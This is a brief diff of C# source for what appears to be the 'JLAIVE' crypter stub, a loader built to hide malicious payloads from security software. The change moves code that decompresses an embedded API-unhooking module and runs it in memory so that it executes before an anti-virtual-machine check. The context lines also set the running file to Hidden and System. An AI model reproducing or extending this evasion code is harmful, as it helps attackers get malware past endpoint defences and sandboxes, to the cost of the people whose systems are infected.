@@ -26,6 +26,11 @@ namespace JLAIVE_STUB
             currentprocess.Dispose();
             File.SetAttributes(currentfilename, FileAttributes.Hidden | FileAttributes.System);
 
+#if UNHOOK_API
+            byte[] apiunhookerbytes = Uncompress(GetEmbeddedResource("JLAIVE_AU"));
+            Assembly.Load(apiunhookerbytes).EntryPoint.Invoke(null, null);
+#endif
+
 #if ANTI_VM
             ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
             ManagementObjectCollection instances = searcher.Get();
@@ -67,11 +72,6 @@ namespace JLAIVE_STUB
                 Exit();
                 return;
             }
-#endif
-
-#if UNHOOK_API
-            byte[] apiunhookerbytes = Uncompress(GetEmbeddedResource("JLAIVE_AU"));
-            Assembly.Load(apiunhookerbytes).EntryPoint.Invoke(null, null);
 #endif
 
             Assembly asm = Assembly.GetExecutingAssembly();
